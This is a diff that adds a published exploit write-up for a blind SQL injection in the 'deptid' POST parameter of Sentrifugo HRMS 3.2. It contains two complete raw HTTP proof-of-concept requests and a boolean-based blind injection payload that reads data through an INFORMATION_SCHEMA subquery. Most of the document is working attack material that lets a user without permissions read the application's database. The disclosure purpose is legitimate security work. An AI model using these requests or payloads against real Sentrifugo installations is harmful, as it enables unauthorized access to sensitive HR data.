@@ -1,0 +1,64 @@
+# Exploit Title: Sentrifugo HRMS 3.2 - 'deptid' SQL Injection
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-08-26
+# Google Dork: N/A
+# Vendor: http://www.sapplica.com
+# Software Link: http://www.sentrifugo.com/download
+# Affected Version: 3.2 and possibly before
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: PHP
+# Tested on: Win10x64 & Kali Linux
+# CVE: N/A
+ 
+# 1. Technical Description:
+# Sentrifugo HRMS version 3.2 and possibly before are affected by Blind SQL Injection in deptid
+# parameter through POST request in "/index.php/servicedeskconf/getemployees/format/html" resource.
+# This allows a user of the application without permissions to read sensitive information from
+# the database used by the application.
+  
+# 2. Proof Of Concept (PoC):
+# 2.1 The following POST request generates an error 500 in the Application (add ' in deptid parameter)
+
+POST /sentrifugo/index.php/servicedeskconf/getemployees/format/html HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html, */*; q=0.01
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/sentrifugo/index.php/servicedeskconf/add
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 28
+Cookie: PHPSESSID=25kchrvj0e3akklgh0inrubqu0
+Connection: close
+
+bunitid=0&deptid='&reqfor=2
+
+# 2.2 In another request, add two ' to receive a code 200 OK
+
+POST /sentrifugo/index.php/servicedeskconf/getemployees/format/html HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html, */*; q=0.01
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/sentrifugo/index.php/servicedeskconf/add
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 28
+Cookie: PHPSESSID=25kchrvj0e3akklgh0inrubqu0
+Connection: close
+
+bunitid=0&deptid=''&reqfor=2
+
+# 3. Payload:
+
+Parameter: deptid (POST)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: bunitid=0&deptid=(SELECT (CASE WHEN (5610=5610) THEN 5610 ELSE 5610*(SELECT 5610 FROM INFORMATION_SCHEMA.PLUGINS) END))&reqfor=2
+
+# 4. Reference:
+# https://hackpuntes.com/cve-2018-15873-sentrifugo-hrms-3-2-blind-sql-injection/
